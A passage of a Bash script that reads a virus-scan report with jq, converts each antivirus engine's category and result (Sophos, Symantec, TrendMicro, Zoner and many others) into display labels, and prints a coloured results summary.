    elif [[ ${RISING_Category} == *"malicious"* ]];then
    RISING_Category="Malicious!"
    elif [[ ${RISING_Category} == *"failure"* ]];then
    RISING_Category="ERROR!"
    elif [[ -z ${RISING_Category} ]];then
    RISING_Category="ERROR!"
    fi

    RISING_Result=$(jq '.[] | .attributes.last_analysis_results."Rising".result' FILERESULTS.json | xargs)
    if [[ ${RISING_Result} == *"null"* ]];then
    RISING_Result="Null"
    elif [[ -z ${RISING_Result} ]];then
    RISING_Result="ERROR!"
    fi



    SANGFOR_Category=$(jq '.[] | .attributes.last_analysis_results."Sangfor".category' FILERESULTS.json | xargs) 
    if [[ ${SANGFOR_Category} == *"undetected"* ]];then
    SANGFOR_Category="No Virus Detected."
    elif [[ ${SANGFOR_Category} == *"null"* ]];then
    SANGFOR_Category="Null"
    elif [[ ${SANGFOR_Category} == *"type-unsupported"* ]];then
    SANGFOR_Category="Unsupported"
    elif [[ ${SANGFOR_Category} == *"malicious"* ]];then
    SANGFOR_Category="Malicious!"
    elif [[ ${SANGFOR_Category} == *"failure"* ]];then
    SANGFOR_Category="ERROR!"
    elif [[ -z ${SANGFOR_Category} ]];then
    SANGFOR_Category="ERROR!"
    fi

    SANGFOR_Result=$(jq '.[] | .attributes.last_analysis_results."Sangfor".result' FILERESULTS.json | xargs)
    if [[ ${SANGFOR_Result} == *"null"* ]];then
    SANGFOR_Result="Null"
    elif [[ -z ${SANGFOR_Result} ]];then
    SANGFOR_Result="ERROR!"
    fi



    SOPHOS_Category=$(jq '.[] | .attributes.last_analysis_results."Sophos".category' FILERESULTS.json | xargs) 
    if [[ ${SOPHOS_Category} == *"undetected"* ]];then
    SOPHOS_Category="No Virus Detected."
    elif [[ ${SOPHOS_Category} == *"null"* ]];then
    SOPHOS_Category="Null"
    elif [[ ${SOPHOS_Category} == *"type-unsupported"* ]];then
    SOPHOS_Category="Unsupported"
    elif [[ ${SOPHOS_Category} == *"malicious"* ]];then
    SOPHOS_Category="Malicious!"
    elif [[ ${SOPHOS_Category} == *"failure"* ]];then
    SOPHOS_Category="ERROR!"
    elif [[ -z ${SOPHOS_Category} ]];then
    SOPHOS_Category="ERROR!"
    fi

    SOPHOS_Result=$(jq '.[] | .attributes.last_analysis_results."Sophos".result' FILERESULTS.json | xargs)
    if [[ ${SOPHOS_Result} == *"null"* ]];then
    SOPHOS_Result="Null"
    elif [[ -z ${SOPHOS_Result} ]];then
    SOPHOS_Result="ERROR!"
    fi



    SAS_Category=$(jq '.[] | .attributes.last_analysis_results."SUPERAntiSpyware".category' FILERESULTS.json | xargs) 
    if [[ ${SAS_Category} == *"undetected"* ]];then
    SAS_Category="No Virus Detected."
    elif [[ ${SAS_Category} == *"null"* ]];then
    SAS_Category="Null"
    elif [[ ${SAS_Category} == *"type-unsupported"* ]];then
    SAS_Category="Unsupported"
    elif [[ ${SAS_Category} == *"malicious"* ]];then
    SAS_Category="Malicious!"
    elif [[ ${SAS_Category} == *"failure"* ]];then
    SAS_Category="ERROR!"
    elif [[ -z ${SAS_Category} ]];then
    SAS_Category="ERROR!"
    fi

    SAS_Result=$(jq '.[] | .attributes.last_analysis_results."SUPERAntiSpyware".result' FILERESULTS.json | xargs)
    if [[ ${SAS_Result} == *"null"* ]];then
    SAS_Result="Null"
    elif [[ -z ${SAS_Result} ]];then
    SAS_Result="ERROR!"
    fi



    SYMANTEC_Category=$(jq '.[] | .attributes.last_analysis_results."Symantec".category' FILERESULTS.json | xargs) 
    if [[ ${SYMANTEC_Category} == *"undetected"* ]];then
    SYMANTEC_Category="No Virus Detected."
    elif [[ ${SYMANTEC_Category} == *"null"* ]];then
    SYMANTEC_Category="Null"
    elif [[ ${SYMANTEC_Category} == *"type-unsupported"* ]];then
    SYMANTEC_Category="Unsupported"
    elif [[ ${SYMANTEC_Category} == *"malicious"* ]];then
    SYMANTEC_Category="Malicious!"
    elif [[ ${SYMANTEC_Category} == *"failure"* ]];then
    SYMANTEC_Category="ERROR!"
    elif [[ -z ${SYMANTEC_Category} ]];then
    SYMANTEC_Category="ERROR!"
    fi

    SYMANTEC_Result=$(jq '.[] | .attributes.last_analysis_results."Symantec".result' FILERESULTS.json | xargs)
    if [[ ${SYMANTEC_Result} == *"null"* ]];then
    SYMANTEC_Result="Null"
    elif [[ -z ${SYMANTEC_Result} ]];then
    SYMANTEC_Result="ERROR!"
    fi



    SYMANTECMOBILE_Category=$(jq '.[] | .attributes.last_analysis_results."SymantecMobileInsight".category' FILERESULTS.json | xargs) 
    if [[ ${SYMANTECMOBILE_Category} == *"undetected"* ]];then
    SYMANTECMOBILE_Category="No Virus Detected."
    elif [[ ${SYMANTECMOBILE_Category} == *"null"* ]];then
    SYMANTECMOBILE_Category="Null"
    elif [[ ${SYMANTECMOBILE_Category} == *"type-unsupported"* ]];then
    SYMANTECMOBILE_Category="Unsupported"
    elif [[ ${SYMANTECMOBILE_Category} == *"malicious"* ]];then
    SYMANTECMOBILE_Category="Malicious!"
    elif [[ ${SYMANTECMOBILE_Category} == *"failure"* ]];then
    SYMANTECMOBILE_Category="ERROR!"
    elif [[ -z ${SYMANTECMOBILE_Category} ]];then
    SYMANTECMOBILE_Category="ERROR!"
    fi

    SYMANTECMOBILE_Result=$(jq '.[] | .attributes.last_analysis_results."SymantecMobileInsight".result' FILERESULTS.json | xargs)
    if [[ ${SYMANTECMOBILE_Result} == *"null"* ]];then
    SYMANTECMOBILE_Result="Null"
    elif [[ -z ${SYMANTECMOBILE_Result} ]];then
    SYMANTECMOBILE_Result="ERROR!"
    fi



    SAAPEX_Category=$(jq '.[] | .attributes.last_analysis_results."APEX".category' FILERESULTS.json | xargs) 
    if [[ ${SAAPEX_Category} == *"undetected"* ]];then
    SAAPEX_Category="No Virus Detected."
    elif [[ ${SAAPEX_Category} == *"null"* ]];then
    SAAPEX_Category="Null"
    elif [[ ${SAAPEX_Category} == *"type-unsupported"* ]];then
    SAAPEX_Category="Unsupported"
    elif [[ ${SAAPEX_Category} == *"malicious"* ]];then
    SAAPEX_Category="Malicious!"
    elif [[ ${SAAPEX_Category} == *"failure"* ]];then
    SAAPEX_Category="ERROR!"
    elif [[ -z ${SAAPEX_Category} ]];then
    SAAPEX_Category="ERROR!"
    fi

    SAAPEX_Result=$(jq '.[] | .attributes.last_analysis_results."APEX".result' FILERESULTS.json | xargs)
    if [[ ${SAAPEX_Result} == *"null"* ]];then
    SAAPEX_Result="Null"
    elif [[ -z ${SAAPEX_Result} ]];then
    SAAPEX_Result="ERROR!"
    fi



    SENTINELONE_Category=$(jq '.[] | .attributes.last_analysis_results."SentinelOne".category' FILERESULTS.json | xargs) 
    if [[ ${SENTINELONE_Category} == *"undetected"* ]];then
    SENTINELONE_Category="No Virus Detected."
    elif [[ ${SENTINELONE_Category} == *"null"* ]];then
    SENTINELONE_Category="Null"
    elif [[ ${SENTINELONE_Category} == *"type-unsupported"* ]];then
    SENTINELONE_Category="Unsupported"
    elif [[ ${SENTINELONE_Category} == *"malicious"* ]];then
    SENTINELONE_Category="Malicious!"
    elif [[ ${SENTINELONE_Category} == *"failure"* ]];then
    SENTINELONE_Category="ERROR!"
    elif [[ -z ${SENTINELONE_Category} ]];then
    SENTINELONE_Category="ERROR!"
    fi

    SENTINELONE_Result=$(jq '.[] | .attributes.last_analysis_results."SentinelOne".result' FILERESULTS.json | xargs)
    if [[ ${SENTINELONE_Result} == *"null"* ]];then
    SENTINELONE_Result="Null"
    elif [[ -z ${SENTINELONE_Result} ]];then
    SENTINELONE_Result="ERROR!"
    fi



    TACHYON_Category=$(jq '.[] | .attributes.last_analysis_results."TACHYON".category' FILERESULTS.json | xargs) 
    if [[ ${TACHYON_Category} == *"undetected"* ]];then
    TACHYON_Category="No Virus Detected."
    elif [[ ${TACHYON_Category} == *"null"* ]];then
    TACHYON_Category="Null"
    elif [[ ${TACHYON_Category} == *"type-unsupported"* ]];then
    TACHYON_Category="Unsupported"
    elif [[ ${TACHYON_Category} == *"malicious"* ]];then
    TACHYON_Category="Malicious!"
    elif [[ ${TACHYON_Category} == *"failure"* ]];then
    TACHYON_Category="ERROR!"
    elif [[ -z ${TACHYON_Category} ]];then
    TACHYON_Category="ERROR!"
    fi

    TACHYON_Result=$(jq '.[] | .attributes.last_analysis_results."TACHYON".result' FILERESULTS.json | xargs)
    if [[ ${TACHYON_Result} == *"null"* ]];then
    TACHYON_Result="Null"
    elif [[ -z ${TACHYON_Result} ]];then
    TACHYON_Result="ERROR!"
    fi



    TENCENT_Category=$(jq '.[] | .attributes.last_analysis_results."Tencent".category' FILERESULTS.json | xargs) 
    if [[ ${TENCENT_Category} == *"undetected"* ]];then
    TENCENT_Category="No Virus Detected."
    elif [[ ${TENCENT_Category} == *"null"* ]];then
    TENCENT_Category="Null"
    elif [[ ${TENCENT_Category} == *"type-unsupported"* ]];then
    TENCENT_Category="Unsupported"
    elif [[ ${TENCENT_Category} == *"malicious"* ]];then
    TENCENT_Category="Malicious!"
    elif [[ ${TENCENT_Category} == *"failure"* ]];then
    TENCENT_Category="ERROR!"
    elif [[ -z ${TENCENT_Category} ]];then
    TENCENT_Category="ERROR!"
    fi

    TENCENT_Result=$(jq '.[] | .attributes.last_analysis_results."Tencent".result' FILERESULTS.json | xargs)
    if [[ ${TENCENT_Result} == *"null"* ]];then
    TENCENT_Result="Null"
    elif [[ -z ${TENCENT_Result} ]];then
    TENCENT_Result="ERROR!"
    fi



    FIREEYE_Category=$(jq '.[] | .attributes.last_analysis_results."FireEye".category' FILERESULTS.json | xargs) 
    if [[ ${FIREEYE_Category} == *"undetected"* ]];then
    FIREEYE_Category="No Virus Detected."
    elif [[ ${FIREEYE_Category} == *"null"* ]];then
    FIREEYE_Category="Null"
    elif [[ ${FIREEYE_Category} == *"type-unsupported"* ]];then
    FIREEYE_Category="Unsupported"
    elif [[ ${FIREEYE_Category} == *"malicious"* ]];then
    FIREEYE_Category="Malicious!"
    elif [[ ${FIREEYE_Category} == *"failure"* ]];then
    FIREEYE_Category="ERROR!"
    elif [[ -z ${FIREEYE_Category} ]];then
    FIREEYE_Category="ERROR!"
    fi

    FIREEYE_Result=$(jq '.[] | .attributes.last_analysis_results."FireEye".result' FILERESULTS.json | xargs)
    if [[ ${FIREEYE_Result} == *"null"* ]];then
    FIREEYE_Result="Null"
    elif [[ -z ${FIREEYE_Result} ]];then
    FIREEYE_Result="ERROR!"
    fi



    TRENDMICRO_Category=$(jq '.[] | .attributes.last_analysis_results."TrendMicro".category' FILERESULTS.json | xargs) 
    if [[ ${TRENDMICRO_Category} == *"undetected"* ]];then
    TRENDMICRO_Category="No Virus Detected."
    elif [[ ${TRENDMICRO_Category} == *"null"* ]];then
    TRENDMICRO_Category="Null"
    elif [[ ${TRENDMICRO_Category} == *"type-unsupported"* ]];then
    TRENDMICRO_Category="Unsupported"
    elif [[ ${TRENDMICRO_Category} == *"malicious"* ]];then
    TRENDMICRO_Category="Malicious!"
    elif [[ ${TRENDMICRO_Category} == *"failure"* ]];then
    TRENDMICRO_Category="ERROR!"
    elif [[ -z ${TRENDMICRO_Category} ]];then
    TRENDMICRO_Category="ERROR!"
    fi

    TRENDMICRO_Result=$(jq '.[] | .attributes.last_analysis_results."TrendMicro".result' FILERESULTS.json | xargs)
    if [[ ${TRENDMICRO_Result} == *"null"* ]];then
    TRENDMICRO_Result="Null"
    elif [[ -z ${TRENDMICRO_Result} ]];then
    TRENDMICRO_Result="ERROR!"
    fi



    TRENDMICROHC_Category=$(jq '.[] | .attributes.last_analysis_results."TrendMicro-HouseCall".category' FILERESULTS.json | xargs) 
    if [[ ${TRENDMICROHC_Category} == *"undetected"* ]];then
    TRENDMICROHC_Category="No Virus Detected."
    elif [[ ${TRENDMICROHC_Category} == *"null"* ]];then
    TRENDMICROHC_Category="Null"
    elif [[ ${TRENDMICROHC_Category} == *"type-unsupported"* ]];then
    TRENDMICROHC_Category="Unsupported"
    elif [[ ${TRENDMICROHC_Category} == *"malicious"* ]];then
    TRENDMICROHC_Category="Malicious!"
    elif [[ ${TRENDMICROHC_Category} == *"failure"* ]];then
    TRENDMICROHC_Category="ERROR!"
    elif [[ -z ${TRENDMICROHC_Category} ]];then
    TRENDMICROHC_Category="ERROR!"
    fi

    TRENDMICROHC_Result=$(jq '.[] | .attributes.last_analysis_results."TrendMicro-HouseCall".result' FILERESULTS.json | xargs)
    if [[ ${TRENDMICROHC_Result} == *"null"* ]];then
    TRENDMICROHC_Result="Null"
    elif [[ -z ${TRENDMICROHC_Result} ]];then
    TRENDMICROHC_Result="ERROR!"
    fi



    TEHTRIS_Category=$(jq '.[] | .attributes.last_analysis_results."tehtris".category' FILERESULTS.json | xargs) 
    if [[ ${TEHTRIS_Category} == *"undetected"* ]];then
    TEHTRIS_Category="No Virus Detected."
    elif [[ ${TEHTRIS_Category} == *"null"* ]];then
    TEHTRIS_Category="Null"
    elif [[ ${TEHTRIS_Category} == *"type-unsupported"* ]];then
    TEHTRIS_Category="Unsupported"
    elif [[ ${TEHTRIS_Category} == *"malicious"* ]];then
    TEHTRIS_Category="Malicious!"
    elif [[ ${TEHTRIS_Category} == *"failure"* ]];then
    TEHTRIS_Category="ERROR!"
    elif [[ -z ${TEHTRIS_Category} ]];then
    TEHTRIS_Category="ERROR!"
    fi

    TEHTRIS_Result=$(jq '.[] | .attributes.last_analysis_results."tehtris".result' FILERESULTS.json | xargs)
    if [[ ${TEHTRIS_Result} == *"null"* ]];then
    TEHTRIS_Result="Null"
    elif [[ -z ${TEHTRIS_Result} ]];then
    TEHTRIS_Result="ERROR!"
    fi



    TRAPMINE_Category=$(jq '.[] | .attributes.last_analysis_results."Trapmine".category' FILERESULTS.json | xargs) 
    if [[ ${TRAPMINE_Category} == *"undetected"* ]];then
    TRAPMINE_Category="No Virus Detected."
    elif [[ ${TRAPMINE_Category} == *"null"* ]];then
    TRAPMINE_Category="Null"
    elif [[ ${TRAPMINE_Category} == *"type-unsupported"* ]];then
    TRAPMINE_Category="Unsupported"
    elif [[ ${TRAPMINE_Category} == *"malicious"* ]];then
    TRAPMINE_Category="Malicious!"
    elif [[ ${TRAPMINE_Category} == *"failure"* ]];then
    TRAPMINE_Category="ERROR!"
    elif [[ -z ${TRAPMINE_Category} ]];then
    TRAPMINE_Category="ERROR!"
    fi

    TRAPMINE_Result=$(jq '.[] | .attributes.last_analysis_results."Trapmine".result' FILERESULTS.json | xargs)
    if [[ ${TRAPMINE_Result} == *"null"* ]];then
    TRAPMINE_Result="Null"
    elif [[ -z ${TRAPMINE_Result} ]];then
    TRAPMINE_Result="ERROR!"
    fi



    TRUSTLOOK_Category=$(jq '.[] | .attributes.last_analysis_results."Trustlook".category' FILERESULTS.json | xargs) 
    if [[ ${TRUSTLOOK_Category} == *"undetected"* ]];then
    TRUSTLOOK_Category="No Virus Detected."
    elif [[ ${TRUSTLOOK_Category} == *"null"* ]];then
    TRUSTLOOK_Category="Null"
    elif [[ ${TRUSTLOOK_Category} == *"type-unsupported"* ]];then
    TRUSTLOOK_Category="Unsupported"
    elif [[ ${TRUSTLOOK_Category} == *"malicious"* ]];then
    TRUSTLOOK_Category="Malicious!"
    elif [[ ${TRUSTLOOK_Category} == *"failure"* ]];then
    TRUSTLOOK_Category="ERROR!"
    elif [[ -z ${TRUSTLOOK_Category} ]];then
    TRUSTLOOK_Category="ERROR!"
    fi

    TRUSTLOOK_Result=$(jq '.[] | .attributes.last_analysis_results."Trustlook".result' FILERESULTS.json | xargs)
    if [[ ${TRUSTLOOK_Result} == *"null"* ]];then
    TRUSTLOOK_Result="Null"
    elif [[ -z ${TRUSTLOOK_Result} ]];then
    TRUSTLOOK_Result="ERROR!"
    fi



    VBA32_Category=$(jq '.[] | .attributes.last_analysis_results."VBA32".category' FILERESULTS.json | xargs) 
    if [[ ${VBA32_Category} == *"undetected"* ]];then
    VBA32_Category="No Virus Detected."
    elif [[ ${VBA32_Category} == *"null"* ]];then
    VBA32_Category="Null"
    elif [[ ${VBA32_Category} == *"type-unsupported"* ]];then
    VBA32_Category="Unsupported"
    elif [[ ${VBA32_Category} == *"malicious"* ]];then
    VBA32_Category="Malicious!"
    elif [[ ${VBA32_Category} == *"failure"* ]];then
    VBA32_Category="ERROR!"
    elif [[ -z ${VBA32_Category} ]];then
    VBA32_Category="ERROR!"
    fi

    VBA32_Result=$(jq '.[] | .attributes.last_analysis_results."VBA32".result' FILERESULTS.json | xargs)
    if [[ ${VBA32_Result} == *"null"* ]];then
    VBA32_Result="Null"
    elif [[ -z ${VBA32_Result} ]];then
    VBA32_Result="ERROR!"
    fi



    VIRIT_Category=$(jq '.[] | .attributes.last_analysis_results."VirIT".category' FILERESULTS.json | xargs) 
    if [[ ${VIRIT_Category} == *"undetected"* ]];then
    VIRIT_Category="No Virus Detected."
    elif [[ ${VIRIT_Category} == *"null"* ]];then
    VIRIT_Category="Null"
    elif [[ ${VIRIT_Category} == *"type-unsupported"* ]];then
    VIRIT_Category="Unsupported"
    elif [[ ${VIRIT_Category} == *"malicious"* ]];then
    VIRIT_Category="Malicious!"
    elif [[ ${VIRIT_Category} == *"failure"* ]];then
    VIRIT_Category="ERROR!"
    elif [[ -z ${VIRIT_Category} ]];then
    VIRIT_Category="ERROR!"
    fi

    VIRIT_Result=$(jq '.[] | .attributes.last_analysis_results."VirIT".result' FILERESULTS.json | xargs)
    if [[ ${VIRIT_Result} == *"null"* ]];then
    VIRIT_Result="Null"
    elif [[ -z ${VIRIT_Result} ]];then
    VIRIT_Result="ERROR!"
    fi



    VIROBOT_Category=$(jq '.[] | .attributes.last_analysis_results."ViRobot".category' FILERESULTS.json | xargs) 
    if [[ ${VIROBOT_Category} == *"undetected"* ]];then
    VIROBOT_Category="No Virus Detected."
    elif [[ ${VIROBOT_Category} == *"null"* ]];then
    VIROBOT_Category="Null"
    elif [[ ${VIROBOT_Category} == *"type-unsupported"* ]];then
    VIROBOT_Category="Unsupported"
    elif [[ ${VIROBOT_Category} == *"malicious"* ]];then
    VIROBOT_Category="Malicious!"
    elif [[ ${VIROBOT_Category} == *"failure"* ]];then
    VIROBOT_Category="ERROR!"
    elif [[ -z ${VIROBOT_Category} ]];then
    VIROBOT_Category="ERROR!"
    fi

    VIROBOT_Result=$(jq '.[] | .attributes.last_analysis_results."ViRobot".result' FILERESULTS.json | xargs)
    if [[ ${VIROBOT_Result} == *"null"* ]];then
    VIROBOT_Result="Null"
    elif [[ -z ${VIROBOT_Result} ]];then
    VIROBOT_Result="ERROR!"
    fi



    WEBROOT_Category=$(jq '.[] | .attributes.last_analysis_results."Webroot".category' FILERESULTS.json | xargs) 
    if [[ ${WEBROOT_Category} == *"undetected"* ]];then
    WEBROOT_Category="No Virus Detected."
    elif [[ ${WEBROOT_Category} == *"null"* ]];then
    WEBROOT_Category="Null"
    elif [[ ${WEBROOT_Category} == *"type-unsupported"* ]];then
    WEBROOT_Category="Unsupported"
    elif [[ ${WEBROOT_Category} == *"malicious"* ]];then
    WEBROOT_Category="Malicious!"
    elif [[ ${WEBROOT_Category} == *"failure"* ]];then
    WEBROOT_Category="ERROR!"
    elif [[ -z ${WEBROOT_Category} ]];then
    WEBROOT_Category="ERROR!"
    fi

    WEBROOT_Result=$(jq '.[] | .attributes.last_analysis_results."Webroot".result' FILERESULTS.json | xargs)
    if [[ ${WEBROOT_Result} == *"null"* ]];then
    WEBROOT_Result="Null"
    elif [[ -z ${WEBROOT_Result} ]];then
    WEBROOT_Result="ERROR!"
    fi



    YANDEX_Category=$(jq '.[] | .attributes.last_analysis_results."Yandex".category' FILERESULTS.json | xargs) 
    if [[ ${YANDEX_Category} == *"undetected"* ]];then
    YANDEX_Category="No Virus Detected."
    elif [[ ${YANDEX_Category} == *"null"* ]];then
    YANDEX_Category="Null"
    elif [[ ${YANDEX_Category} == *"type-unsupported"* ]];then
    YANDEX_Category="Unsupported"
    elif [[ ${YANDEX_Category} == *"malicious"* ]];then
    YANDEX_Category="Malicious!"
    elif [[ ${YANDEX_Category} == *"failure"* ]];then
    YANDEX_Category="ERROR!"
    elif [[ -z ${YANDEX_Category} ]];then
    YANDEX_Category="ERROR!"
    fi

    YANDEX_Result=$(jq '.[] | .attributes.last_analysis_results."Yandex".result' FILERESULTS.json | xargs)
    if [[ ${YANDEX_Result} == *"null"* ]];then
    YANDEX_Result="Null"
    elif [[ -z ${YANDEX_Result} ]];then
    YANDEX_Result="ERROR!"
    fi



    ZILLYA_Category=$(jq '.[] | .attributes.last_analysis_results."Zillya".category' FILERESULTS.json | xargs) 
    if [[ ${ZILLYA_Category} == *"undetected"* ]];then
    ZILLYA_Category="No Virus Detected."
    elif [[ ${ZILLYA_Category} == *"null"* ]];then
    ZILLYA_Category="Null"
    elif [[ ${ZILLYA_Category} == *"type-unsupported"* ]];then
    ZILLYA_Category="Unsupported"
    elif [[ ${ZILLYA_Category} == *"malicious"* ]];then
    ZILLYA_Category="Malicious!"
    elif [[ ${ZILLYA_Category} == *"failure"* ]];then
    ZILLYA_Category="ERROR!"
    elif [[ -z ${ZILLYA_Category} ]];then
    ZILLYA_Category="ERROR!"
    fi

    ZILLYA_Result=$(jq '.[] | .attributes.last_analysis_results."Zillya".result' FILERESULTS.json | xargs)
    if [[ ${ZILLYA_Result} == *"null"* ]];then
    ZILLYA_Result="Null"
    elif [[ -z ${ZILLYA_Result} ]];then
    ZILLYA_Result="ERROR!"
    fi



    ZONEALARM_Category=$(jq '.[] | .attributes.last_analysis_results."ZoneAlarm".category' FILERESULTS.json | xargs) 
    if [[ ${ZONEALARM_Category} == *"undetected"* ]];then
    ZONEALARM_Category="No Virus Detected."
    elif [[ ${ZONEALARM_Category} == *"null"* ]];then
    ZONEALARM_Category="Null"
    elif [[ ${ZONEALARM_Category} == *"type-unsupported"* ]];then
    ZONEALARM_Category="Unsupported"
    elif [[ ${ZONEALARM_Category} == *"malicious"* ]];then
    ZONEALARM_Category="Malicious!"
    elif [[ ${ZONEALARM_Category} == *"failure"* ]];then
    ZONEALARM_Category="ERROR!"
    elif [[ -z ${ZONEALARM_Category} ]];then
    ZONEALARM_Category="ERROR!"
    fi

    ZONEALARM_Result=$(jq '.[] | .attributes.last_analysis_results."ZoneAlarm".result' FILERESULTS.json | xargs)
    if [[ ${ZONEALARM_Result} == *"null"* ]];then
    ZONEALARM_Result="Null"
    elif [[ -z ${ZONEALARM_Result} ]];then
    ZONEALARM_Result="ERROR!"
    fi



    ZONER_Category=$(jq '.[] | .attributes.last_analysis_results."Zoner".category' FILERESULTS.json | xargs) 
    if [[ ${ZONER_Category} == *"undetected"* ]];then
    ZONER_Category="No Virus Detected."
    elif [[ ${ZONER_Category} == *"null"* ]];then
    ZONER_Category="Null"
    elif [[ ${ZONER_Category} == *"type-unsupported"* ]];then
    ZONER_Category="Unsupported"
    elif [[ ${ZONER_Category} == *"malicious"* ]];then
    ZONER_Category="Malicious!"
    elif [[ ${ZONER_Category} == *"failure"* ]];then
    ZONER_Category="ERROR!"
    elif [[ -z ${ZONER_Category} ]];then
    ZONER_Category="ERROR!"
    fi

    ZONER_Result=$(jq '.[] | .attributes.last_analysis_results."Zoner".result' FILERESULTS.json | xargs)
    if [[ ${ZONER_Result} == *"null"* ]];then
    ZONER_Result="Null"
    elif [[ -z ${ZONER_Result} ]];then
    ZONER_Result="ERROR!"
    fi

  
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] RESULTS"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Acronis --> ${reset}${ACRONIS_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Acronis Result --> ${reset}${ACRONIS_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Alibaba --> ${reset}${ALIBABA_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Alibaba Result --> ${reset}${ALIBABA_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Ad Aware --> ${reset}${AD_AWARE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Ad Aware Result --> ${reset}${AD_AWARE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] AhnLab-V3 --> ${reset}${AHNLAB_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] AhnLab-V3 Result --> ${reset}${AHNLAB_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] ALYac --> ${reset}${ALYAC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] ALYac Result --> ${reset}${ALYAC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Antiy-AVL  --> ${reset}${ANTIY_AVL_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Antiy-AVL  Result --> ${reset}${ANTIY_AVL_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Arcabit --> ${reset}${ARCABIT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Arcabit Result --> ${reset}${ARCABIT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Avast --> ${reset}${AVAST_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Avast Result --> ${reset}${AVAST_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Avast Mobile --> ${reset}${AVASTMOBILE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Avast Mobile Result --> ${reset}${AVASTMOBILE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Avira --> ${reset}${AVIRA_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Avira Result --> ${reset}${AVIRA_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Baidu --> ${reset}${BAIDU_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Baidu Result --> ${reset}${BAIDU_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Bit Defender --> ${reset}${BITDEFENDER_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Bit Defender Result --> ${reset}${BITDEFENDER_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Bit Defender Falx --> ${reset}${BITDEFENDERFALX_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Bit Defender Falx Result --> ${reset}${BITDEFENDERFALX_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Bit Defender Theta --> ${reset}${BITDEFENDERTHETA_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Bit Defender Theta Result --> ${reset}${BITDEFENDERTHETA_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] BKav --> ${reset}${BKAV_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] BKav Result --> ${reset}${BKAV_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] CAT Quick Heal --> ${reset}${CATQUICKHEAL_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] CAT Quick Heal Result --> ${reset}${CATQUICKHEAL_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Crowd Strike --> ${reset}${CROWDSTRIKE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Crowd Strike Result --> ${reset}${CROWDSTRIKE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] ClamAV --> ${reset}${CLAMAV_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] ClamAV Result --> ${reset}${CLAMAV_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] CMC --> ${reset}${CMC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] CMC Result --> ${reset}${CMC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Comodo --> ${reset}${COMODO_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Comodo Result --> ${reset}${COMODO_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cybereason --> ${reset}${CYBEREASON_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cybereason Result --> ${reset}${CYBEREASON_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cynet --> ${reset}${CYNET_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cynet Result --> ${reset}${CYNET_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cyren --> ${reset}${CYREN_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cyren Result --> ${reset}${CYREN_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cylance --> ${reset}${CYLANCE_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cylance Result --> ${reset}${CYLANCE_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] DrWeb --> ${reset}${DRWEB_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] DrWeb Result --> ${reset}${DRWEB_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Emsisoft --> ${reset}${EMSISOFT_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Emsisoft Result --> ${reset}${EMSISOFT_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Elastic --> ${reset}${ELASTIC_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] Elastic Result --> ${reset}${ELASTIC_Result}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] eScan --> ${reset}${MWSCAN_Category}"
    echo -e "${greenbold}[${reset}*${greenbold}] eScan Result --> ${reset}${MWSCAN_Result}"
    echo -e ""
